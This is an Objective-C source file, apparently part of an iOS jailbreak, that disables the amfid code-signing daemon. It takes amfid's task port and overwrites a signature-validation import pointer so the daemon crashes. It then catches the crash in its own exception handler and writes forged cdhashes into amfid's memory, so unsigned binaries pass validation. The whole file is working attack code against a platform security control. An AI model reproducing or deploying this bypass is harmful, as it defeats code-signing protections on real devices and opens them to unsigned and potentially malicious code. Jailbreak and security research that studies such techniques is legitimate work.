#import "amfid.h"
#import "amfid_mem.h"
#import "amfi_utils.h"
#import "amfid_tools.h"
#import "kernel_utils.h"
#import "cs_blob.h"
#import "offsetof.h"
#import <Foundation/Foundation.h>

// we'll make amfid crash when it validates stuff
// then we redirect execution to ourselves as an exception handler
// and handle validation ourselves
// Ian Beer's technique & Electra's patch

pthread_t exceptionThread;
static mach_port_name_t AMFID_ExceptionPort = MACH_PORT_NULL;
uint64_t origAMFID_MISVSACI = 0;
uint64_t amfid_base;

void* AMFIDExceptionHandler(void* arg) {

    uint32_t size = 0x1000;
    mach_msg_header_t* msg = malloc(size);
    
    for(;;) {
        kern_return_t ret;
        printf("[amfid][*] Calling mach_msg to receive exception message from amfid\n");
        ret = mach_msg(msg, MACH_RCV_MSG | MACH_MSG_TIMEOUT_NONE, 0, size, AMFID_ExceptionPort, 0, 0);
        
        if (ret != KERN_SUCCESS){
            printf("[amfid][-] Error receiving exception port: %s\n", mach_error_string(ret));
            continue;
        } else {
            printf("[amfid][+] Got called!\n");
            exception_raise_request* req = (exception_raise_request*)msg;
            
            mach_port_t thread_port = req->thread.name;
            mach_port_t task_port = req->task.name;
            
            // we need to get some info from amfid's thread state
            _STRUCT_ARM_THREAD_STATE64 old_state = {0};
            mach_msg_type_number_t old_stateCnt = sizeof(old_state)/4;
            
            ret = thread_get_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&old_state, &old_stateCnt);
            if (ret != KERN_SUCCESS){
                printf("[amfid][-] Error getting thread state: %s\n", mach_error_string(ret));
                continue;
            }
            
            printf("[amfid][+] Got thread state!\n");
            
            //create a copy of the thread state
            _STRUCT_ARM_THREAD_STATE64 new_state;
            memcpy(&new_state, &old_state, sizeof(_STRUCT_ARM_THREAD_STATE64));
            
            // get the filename pointed to by X25
            char* filename = (char*)AmfidRead(new_state.__x[25], 1024);
            uint8_t *orig_cdhash = (uint8_t*)AmfidRead(new_state.__x[24], CS_CDHASH_LEN);
            
            printf("[amfid][+] Got request for: %s\n", filename);
            printf("[amfid][*] Original cdhash: \n\t");
            for (int i = 0; i < CS_CDHASH_LEN; i++) {
                printf("%02x ", orig_cdhash[i]);
            }
            printf("\n");
            
            if (strlen((char*)orig_cdhash)) {
                // legit binary
                // jump to old MIVSACI
                amfid_base = binary_load_address(task_port);
                printf("[amfid][*] Jumping thread to 0x%llx\n", origAMFID_MISVSACI);
                new_state.__pc = origAMFID_MISVSACI;
            } else {
                uint8_t* code_directory = getCodeDirectory(filename);
                if (!code_directory) {
                    printf("[amfid][-] Can't get code directory\n");
                    goto end;
                }
                uint8_t cd_hash[CS_CDHASH_LEN];
                if (parse_superblob(code_directory, cd_hash)) {
                    printf("[amfid][-] parse_superblob failed\n");
                    goto end;
                }
                
                //debug
                printf("[amfid][*] New cdhash: \n\t");
                for (int i = 0; i < CS_CDHASH_LEN; i++) {
                    printf("%02x ", cd_hash[i]);
                }
                printf("\n");
                
                new_state.__pc = origAMFID_MISVSACI;
                
                ret = mach_vm_write(task_port, old_state.__x[24], (vm_offset_t)&cd_hash, 20);
                if (ret == KERN_SUCCESS)
                {
                    printf("[amfid][+] Wrote the cdhash into amfid\n");
                } else {
                    printf("[amfid][-] Unable to write the cdhash into amfid!\n");
                }
                
                // write a 1 to [x20]
                AmfidWrite_32bits(old_state.__x[20], 1);
                new_state.__pc = (old_state.__lr & 0xfffffffffffff000) + 0x1000; // 0x2dacwhere to continue
                
                printf("[amfid][i] Old PC: 0x%llx, new PC: 0x%llx\n", old_state.__pc, new_state.__pc);
            }
            
            // set the new thread state:
            ret = thread_set_state(thread_port, 6, (thread_state_t)&new_state, sizeof(new_state)/4);
            if (ret != KERN_SUCCESS) {
                printf("[amfid][-] Failed to set new thread state %s\n", mach_error_string(ret));
            } else {
                printf("[amfid][+] Success setting new state for amfid!\n");
            }
            
            exception_raise_reply reply = {0};
            
            reply.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(req->Head.msgh_bits), 0);
            reply.Head.msgh_size = sizeof(reply);
            reply.Head.msgh_remote_port = req->Head.msgh_remote_port;
            reply.Head.msgh_local_port = MACH_PORT_NULL;
            reply.Head.msgh_id = req->Head.msgh_id + 0x64;
            
            reply.NDR = req->NDR;
            reply.RetCode = KERN_SUCCESS;
            // MACH_SEND_MSG|MACH_MSG_OPTION_NONE == 1 ???
            ret = mach_msg(&reply.Head,
                           1,
                           (mach_msg_size_t)sizeof(reply),
                           0,
                           MACH_PORT_NULL,
                           MACH_MSG_TIMEOUT_NONE,
                           MACH_PORT_NULL);
            
            mach_port_deallocate(mach_task_self(), thread_port);
            mach_port_deallocate(mach_task_self(), task_port);
            if (ret != KERN_SUCCESS){
                printf("[amfid][-] Failed to send the reply to the exception message %s\n", mach_error_string(ret));
            } else{
                printf("[amfid][+] Replied to the amfid exception...\n");
            }
            
        end:;
            free(filename);
            free(orig_cdhash);
        }
    }
    return NULL;
}

int setAmfidExceptionHandler(mach_port_t amfid_task_port, void *(exceptionHandler)(void*)) {

    if (!MACH_PORT_VALID(amfid_task_port)) {
        printf("[-] Invalid amfid task port\n");
        return 1;
    }
    
    // allocate a port to receive exceptions on
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &AMFID_ExceptionPort);
    mach_port_insert_right(mach_task_self(), AMFID_ExceptionPort, AMFID_ExceptionPort, MACH_MSG_TYPE_MAKE_SEND);
    
    if (!MACH_PORT_VALID(AMFID_ExceptionPort)) {
        printf("[-] Invalid amfid exception port\n");
        return 1;
    }
    
    printf("[+] amfid_task_port = 0x%x\n", amfid_task_port);
    printf("[+] AMFID_ExceptionPort = 0x%x\n", AMFID_ExceptionPort);
    
    // set exception handler
    kern_return_t ret = task_set_exception_ports(amfid_task_port, EXC_MASK_ALL, AMFID_ExceptionPort, EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
    
    if (ret != KERN_SUCCESS){
        printf("[-] Error setting amfid exception port: %s\n", mach_error_string(ret));
    } else {
        printf("[+] Success setting amfid exception port!\n");
        
        // setup a new thread where to handle the exceptions
        pthread_create(&exceptionThread, NULL, exceptionHandler, NULL);
        return 0;
    }
    return 1;
}

uint64_t patchAMFID() {
    printf("[*] amfid, it's your turn\n");
    
    pid_t amfid_pid = pid_of_procName("amfid");
    printf("[i] amfid's PID: %d\n", amfid_pid);
    
    // allow us to get amfid's task
    // task_for_pid_in_kernel kinda works but execution gets stuck
    entitlePid(amfid_pid, "get-task-allow", YES);
    setcsflags(amfid_pid);
    
    printf("[*] Getting task port\n");
    
    mach_port_t amfid_task_port;
    kern_return_t kr = task_for_pid(mach_task_self(), amfid_pid, &amfid_task_port);
    
    if (kr) {
        printf("[-] Failed to get amfid's task :(\n\tError: %s\n", mach_error_string(kr));
        return -1;
    }
    
    if (!MACH_PORT_VALID(amfid_task_port)) {
        printf("[-] Failed to get amfid's task port!\n");
        return -1;
    }
    
    printf("[*] Got amfid's task port? :) 0x%x\n", amfid_task_port);
    
    // init amfid memory r/w
    init_amfid_mem(amfid_task_port);
    
    // set the exception handler
    setAmfidExceptionHandler(amfid_task_port, AMFIDExceptionHandler);
    
    printf("[*] About to search for the binary load address\n");
    amfid_base = binary_load_address(amfid_task_port);
    printf("[i] Amfid load address: 0x%llx\n", amfid_base);
    
    mach_vm_size_t sz;
    kr = mach_vm_read_overwrite(amfid_task_port, amfid_base+amfid_MISValidateSignatureAndCopyInfo_import_offset, 8, (mach_vm_address_t)&origAMFID_MISVSACI, &sz);
    
    if (kr != KERN_SUCCESS) {
        printf("[amfid][-] Error reading MISVSACI: %s\n", mach_error_string(kr));
        return -1;
    }
    printf("[i] Original MISVSACI 0x%llx\n", origAMFID_MISVSACI);
    
    // make it crash
    AmfidWrite_64bits(amfid_base + amfid_MISValidateSignatureAndCopyInfo_import_offset, 0x4141414141414141);
    
    printf("[i] AMFID hopefully patched\n");
    printf("\tDon't expect this to keep working after app enters background\n");
    printf("\tTo handle that you need a daemon or code injection\n");
    printf("\tSoon I'll release the former as an amfidebilitate open-source alternative :)\n");
    printf("\tOtherwise use amfid_payload.dylib from Electra with trustbin() & inject_dylib()\n\n");
    
    return origAMFID_MISVSACI;
}
